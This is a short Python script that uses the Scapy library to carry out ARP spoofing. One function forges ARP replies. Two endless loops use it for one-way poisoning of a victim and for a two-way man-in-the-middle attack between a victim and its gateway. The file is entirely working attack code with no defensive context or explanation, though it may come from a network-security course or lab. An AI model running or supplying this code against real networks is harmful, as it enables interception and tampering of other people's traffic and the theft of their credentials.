from scapy.all import *
from setup import *

def arpPoison(macAttacker, macVictim, ipVictim, ipToSpoof, interface):
    arp = Ether() / ARP()
    arp[Ether].src = macAttacker
    arp[ARP].hwsrc = macAttacker
    arp[ARP].psrc = ipToSpoof
    arp[ARP].hwdst = macVictim
    arp[ARP].pdst = ipVictim

    sendp(arp, iface = interface, verbose=False)
    
def oneWayPoisoning(a,interface):
   
    print("\none-way ARP poisoning\n")

    hwA = a["attacker MAC"]
    hwV = a["victim MAC"]
    ipV = a["victim IP"]
    ipG = a["gateway IP"]

    while True:
        arpPoison(hwA, hwV, ipV, ipG, interface)
    
def mimAttack(a,interface):

    print("\nMITM attack using ARP poisoning\n")

    hwA = a["attacker MAC"]
    hwV = a["victim MAC"]
    hwG = a["gateway MAC"]
    ipV = a["victim IP"]
    ipG = a["gateway IP"]

    while True:
        arpPoison(hwA, hwV, ipV, ipG, interface)
        arpPoison(hwA, hwG, ipG, ipV, interface)
